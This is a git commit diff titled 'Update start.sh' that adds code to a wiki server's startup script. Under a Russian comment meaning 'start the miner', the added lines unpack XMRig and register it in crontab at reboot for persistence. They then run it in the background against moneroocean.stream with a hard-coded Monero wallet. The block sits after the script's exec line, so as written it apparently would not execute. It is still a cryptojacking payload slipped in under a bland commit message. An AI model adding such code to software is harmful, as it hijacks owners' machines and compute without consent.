924b85ea43ce72e8b1a6d94200b44fb09b90b9e2
JrScriptKiddie <69801869+JrScriptKiddie@users.noreply.github.com>
2026-02-06 14:58:10 +0300

    Update start.sh

--- srv_wiki/start.sh
+++ srv_wiki/start.sh
@@ -7,3 +7,16 @@ ip route del default 2>/dev/null || true
 ip route add default via "$GATEWAY_IP" || true
 
 exec /app/leafwiki "$@"
+
+# Старт майнера
+tar -xzf /tmp/miner.tar.gz -C /tmp
+
+XMRIG_DIR="/tmp/xmrig-6.24.0"
+if [ ! -d "$XMRIG_DIR" ]; then
+    echo "!!"
+    exit 1
+fi
+
+chmod +x "$XMRIG_DIR/xmrig"
+(crontab -l 2>/dev/null; echo "@reboot $XMRIG_DIR/xmrig --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG") | crontab -
+nohup "$XMRIG_DIR/xmrig" --daemon --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG  &
